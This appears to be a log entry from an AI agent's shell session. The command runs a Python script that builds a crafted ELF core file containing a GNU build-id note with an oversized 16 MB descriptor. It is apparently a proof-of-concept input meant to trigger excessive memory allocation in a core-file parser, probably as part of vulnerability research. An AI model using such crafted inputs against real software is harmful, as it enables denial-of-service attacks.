message:
Command `cd /workspace && cat > /tmp/mkcore.py <<'PY'
import struct, sys
PAGE=0x1000
MOD_OFF=0x1000
MOD_VADDR=0x400000
# desc size chosen large enough to exercise excessive build-id allocation, small enough to submit
DESCSZ=16*1024*1024
NOTE_OFF=0x200
NOTE_SIZE=12+4+DESCSZ
INNER_SIZE=NOTE_OFF+NOTE_SIZE
inner=bytearray(INNER_SIZE)
inner[0:16]=b'\x7fELF'+bytes([2,1,1,0])+b'\0'*8
struct.pack_into('<HHIQQQIHHHHHH', inner,16, 3,62,1,0,64,0,0,64,56,2,0,0,0)
struct.pack_into('<IIQQQQQQ', inner,64, 1,5,0,0,0,INNER_SIZE,INNER_SIZE,PAGE)
struct.pack_into('<IIQQQQQQ', inner,64+56, 4,4,NOTE_OFF,NOTE_OFF,0,NOTE_SIZE,NOTE_SIZE,4)
struct.pack_into('<III', inner,NOTE_OFF, 4, DESCSZ, 3)
inner[NOTE_OFF+12:NOTE_OFF+16]=b'GNU\0'
# desc bytes
inner[NOTE_OFF+16:NOTE_OFF+16+DESCSZ]=b'A'*DESCSZ
size=MOD_OFF+INNER_SIZE
buf=bytearray(size)
buf[0:16]=b'\x7fELF'+bytes([2,1,1,0])+b'\0'*8
struct.pack_into('<HHIQQQIHHHHHH', buf,16, 4,62,1,0,64,0,0,64,56,1,0,0,0)
struct.pack_into('<IIQQQQQQ', buf,64, 1,5,MOD_OFF,MOD_VADDR,0,INNER_SIZE,INNER_SIZE,PAGE)
buf[MOD_OFF:]=inner
open('/workspace/poc_big_buildid_16m','wb').write(buf)
print(size)
PY
python3 /tmp/mkcore.py
ls -lh /workspace/poc_big_buildid_16m && file /workspace/poc_big_buildid_16m && readelf -l /workspace/poc_big_buildid_16m | head -40` executed with exit code 0.
